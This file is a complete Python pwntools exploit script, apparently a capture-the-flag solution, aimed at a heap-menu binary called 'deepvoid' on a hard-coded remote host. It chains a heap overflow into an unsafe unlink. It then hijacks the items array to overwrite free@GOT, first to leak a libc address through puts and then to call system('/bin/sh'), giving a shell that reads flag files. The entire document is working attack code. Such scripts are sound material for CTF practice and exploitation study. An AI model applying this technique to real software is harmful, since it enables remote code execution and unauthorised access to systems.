#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = '39.96.193.120'
PORT = 55555

elf = ELF('./unpacked/deepvoid')
libc = ELF('./unpacked/libc.so.6')

def create(p, idx, size):
    p.sendlineafter(b'CMD >> ', b'1')
    p.sendlineafter(b'Serial: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())

def modify(p, idx, data):
    p.sendlineafter(b'CMD >> ', b'2')
    p.sendlineafter(b'Serial: ', str(idx).encode())
    p.sendafter(b'Update Data: ', data)

def exploit():
    p = remote(HOST, PORT)
    # p = process(['./unpacked/ld-2.23.so', './unpacked/deepvoid'],
    #             env={'LD_PRELOAD': './unpacked/libc.so.6'})

    # ====== Step 1: Allocate chunks ======
    create(p, 0, 0x28)           # chunk0 for fake chunk + overflow
    create(p, 1, 0x80)           # chunk1 victim for unlink
    create(p, 2, 0x20)           # chunk2 barrier (prevent top chunk merge)
    create(p, 3, 0x20)           # chunk3 placeholder
    create(p, 4, 0x20)           # chunk4 holds "/bin/sh"

    modify(p, 4, b'/bin/sh\x00')

    # ====== Step 2: Overflow for Unsafe Unlink ======
    items_addr = 0x6020c0
    fake_fd = items_addr - 0x18   # 0x6020a8
    fake_bk = items_addr - 0x10   # 0x6020b0

    payload = b''
    payload += p64(0)              # fake prev_size
    payload += p64(0x21)           # fake size (0x20 | PREV_INUSE)
    payload += p64(fake_fd)        # fd -> items[0] - 0x18
    payload += p64(fake_bk)        # bk -> items[0] - 0x10
    payload += b'A' * (0x20 - len(payload))
    payload += p64(0x20)           # chunk1 prev_size = fake chunk size
    payload += p64(0x90)           # chunk1 size (PREV_INUSE cleared)

    modify(p, 0, payload)

    # Free chunk1 -> backward consolidation -> unsafe unlink
    # After unlink: items[0] = 0x6020a8
    p.sendlineafter(b'CMD >> ', b'3')
    p.sendlineafter(b'Serial: ', b'1')
    log.success('Unsafe unlink: items[0] = 0x6020a8')

    # ====== Step 3: Rewrite items array ======
    # modify's sendlineafter will consume "[+] Removed.\n...CMD >> " from unlink
    free_got = elf.got['free']    # 0x602018
    puts_got = elf.got['puts']    # 0x602020

    payload2 = p64(0) * 3          # padding (24 bytes to reach items[0])
    payload2 += p64(free_got)      # items[0] = free@GOT
    payload2 += p64(puts_got)      # items[1] = puts@GOT
    modify(p, 0, payload2)
    log.success('items[0]->free@GOT, items[1]->puts@GOT')

    # ====== Step 4: Overwrite free@GOT -> puts@PLT ======
    puts_plt = elf.plt['puts']    # 0x4006d0
    modify(p, 0, p64(puts_plt))
    log.success('free@GOT -> puts@PLT')

    # ====== Step 5: Leak libc ======
    # remove(1) calls free(puts@GOT) -> puts(puts@GOT) -> prints libc puts addr
    p.sendlineafter(b'CMD >> ', b'3')
    p.sendlineafter(b'Serial: ', b'1')

    # puts(puts@GOT) prints 6 bytes of libc puts address then hits null byte
    leak_data = p.recv(6)
    leak_puts = u64(leak_data.ljust(8, b'\x00'))
    log.success('Leaked puts: ' + hex(leak_puts))

    libc_base = leak_puts - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base: ' + hex(libc_base))
    log.success('system: ' + hex(system_addr))

    # ====== Step 6: Overwrite free@GOT -> system ======
    # modify's sendlineafter will consume the remaining output from the leak
    modify(p, 0, p64(system_addr))
    log.success('free@GOT -> system')

    # ====== Step 7: system("/bin/sh") ======
    # remove(4) calls free(items[4]) -> system("/bin/sh")
    p.sendlineafter(b'CMD >> ', b'3')
    p.sendlineafter(b'Serial: ', b'4')

    sleep(0.3)
    p.sendline(b'cat flag*')
    p.sendline(b'cat /flag*')
    p.sendline(b'id')

    p.interactive()

if __name__ == '__main__':
    exploit()
